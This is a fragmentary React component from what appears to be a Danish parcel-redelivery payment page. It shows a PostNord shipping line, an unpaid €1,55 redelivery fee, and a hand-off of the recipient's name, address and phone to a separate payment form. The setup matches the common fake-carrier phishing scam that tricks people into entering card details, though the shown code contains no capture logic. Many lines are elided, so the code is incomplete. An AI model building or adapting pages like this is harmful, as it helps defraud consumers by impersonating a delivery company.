...
import DkPaymentForm from "./DkPaymentForm";
...
const DeReviewForm = ({
  ...
  if (showPaymentForm) {
    return <DkPaymentForm onComplete={() => setIsSubmitted(true)} amount="€1,55" name={name} address={address} city={city} postCode={postCode} phone={phone} />;
  }
  if (isSubmitted) {
        ...
        <Card className="glass-card shadow-2xl border border-green-200/50">
          <CardContent className="text-center py-8">
            ...
            <div className="space-y-3">
              <h2 className="text-xl font-bold text-gray-900">Tak skal du have!</h2>
              <p className="text-gray-600">Din feedback er blevet sendt.</p>
            </div>
          </CardContent>
        </Card>
      </div>;
        ...
        <CardContent className="px-6 mx-0 py-4 my-0">
          ...
          <div className="flex items-center text-sm font-semibold mb-2 -mt-4">
            <span className="relative inline-block drop-shadow-sm">
                <span className="relative z-10">Gennemgå leveringsdetaljer</span>
              </span>
          </div>
        ...
        <CardContent className="px-4 mx-0 my-[5px] py-0">
          ...
          <div className="flex items-center justify-between text-sm font-semibold mb-2 -mt-4">
            <div className="flex items-center">
              ...
              <span className="relative inline-block drop-shadow-sm">
                <span className="relative z-10 text-gray-700 text-sm">Genleveringsgebyrer</span>
              </span>
            </div>
          ...
          <div className="mt-4">
            ...
            <div className="">
              <div className="flex justify-between items-center cursor-pointer py-2" onClick={() => setIsShippingExpanded(!isShippingExpanded)}>
                <div className="flex items-center">
                  <p className="text-gray-700 font-medium text-[11px]">Forsendelse</p>
              ...
              {isShippingExpanded && <div className="flex justify-between items-start pb-3 border-b border-gray-200 animate-fade-in">
                  <div>
                    <p className="text-[11px] text-gray-700">PostNord Standard</p>
                  </div>
                  <div className="text-right">
                    <p className="text-gray-700 font-semibold text-xs">€8.70</p>
                    <p className="text-[11px] text-gray-700">Betalt den {paymentDate}</p>
                  </div>
                </div>}
            </div>
            ...
            <div className="border-b border-gray-200">
              <div className="flex justify-between items-center cursor-pointer py-2" onClick={() => setIsRedeliveryExpanded(!isRedeliveryExpanded)}>
                <div className="flex items-center">
                  <p className="text-gray-700 font-medium text-[11px]">Genlevering</p>
              ...
              {isRedeliveryExpanded && <div className="flex justify-between items-start pb-3 animate-fade-in">
                  <div>
                    <p className="text-[11px] text-gray-700">Standard genlevering</p>
                  </div>
                  <div className="text-right">
                    <p className="text-gray-700 font-semibold text-xs">1.55</p>
                    <p className="text-[11px] text-gray-700">Ubetalt</p>
                  </div>
                </div>}
            </div>
